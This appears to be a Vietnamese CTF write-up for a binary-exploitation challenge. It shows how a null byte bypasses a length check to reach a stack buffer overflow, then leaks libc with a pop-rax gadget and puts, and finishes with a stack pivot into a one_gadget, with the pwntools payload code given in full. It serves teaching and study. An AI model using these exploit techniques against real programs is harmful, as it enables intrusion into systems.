# Phân tích code
<img width="852" height="331" alt="image" src="https://github.com/user-attachments/assets/9726f692-dd21-4a0d-ab11-ec1ff253cd85" />

Trong chương trình này có lỗ hổng *buffer overflow*. Bên dưới có kiểm duyệt độ dài chuỗi nhưng có thể bypass bằng cách nhập NULL BYTE giữa payload.

## Mitigation
<img width="808" height="277" alt="image" src="https://github.com/user-attachments/assets/259b0241-6c6b-4011-8942-4f79c46c20fc" />

No PIE nên các địa chỉ binary cố định để khai thác.

## Gadget
<img width="1167" height="143" alt="image" src="https://github.com/user-attachments/assets/c47602cf-ead5-4aae-b8b9-d18fcd082d1f" />

Các gadget trên không đủ để ta xây dựng ROPchain syscall execve. Chỉ có khả năng điều khiển thanh ghi rax.

## Leak libc
<img width="656" height="422" alt="image" src="https://github.com/user-attachments/assets/07861a98-2bde-4c5d-86aa-2b2c2d5bbd32" />

Quay lại mã được dịch ngược ở dạng Assembly thì thấy `mov rdi, rax`. Và dùng `puts` in dữ liệu trong rdi ra màn hình.
Mà nhờ có gadget kiểm soát rax và No PIE mà ta có thể in địa chỉ libc trong binary.

Nhập vào Stack:

<img width="1595" height="916" alt="image" src="https://github.com/user-attachments/assets/09c98122-d2a8-4ea8-8238-ddc6e8bd1d19" />

- NULL BYTES : bypass kiểm duyệt độ dài chuỗi
- saved rbp -> rw_section : Vì tí nữa sẽ dính *Stack pivot* nên cần đưa vào địa chỉ hợp lệ.
- saved rip -> pop_rax : Lấy địa chỉ GOT chứa hàm libc đẩy vào rax
- exe.got['puts']
- exe.sym['main']+29 : Quay về main để gọi `puts` leak libc

Payload:

    pop_rax=0x0000000000401148
    main=0x0000000000401258
    rw_section=0x4040d8
    
    payload=b'A'*56
    payload+=p64(0)
    payload+=p64(rw_section)
    payload+=p64(pop_rax)
    payload+=p64(exe.got['puts']-0x2ecb)      //chống gadget bẩn phá địa chỉ
    payload+=p64(exe.sym['main']+29)
  
    p.sendlineafter(b'Data:',payload)
    p.recvuntil(b'Thank for playing :)\n')
    libc_leak=u64(p.recvline()[:-1]+b'\x00\x00')
    libc.address=libc_leak-0x80e10

## Stack pivot
<img width="951" height="800" alt="image" src="https://github.com/user-attachments/assets/4ac084e2-0697-4d54-913a-7628d0d398db" />

Lúc này rbp đã đang ở vùng nhớ `rw-`. Dùng `fgets` ghi đè vào sao cho khi *Stack pivot* thì rsp nhảy đến ngay lệnh khai thác.

Payload:

    one_gadget=libc.address+0xebd03
    
    payload=b'A'*56
    payload+=p64(0)
    payload+=p64(rw_section)
    payload+=p64(one_gadget)
    p.sendlineafter(b'Data:',payload)
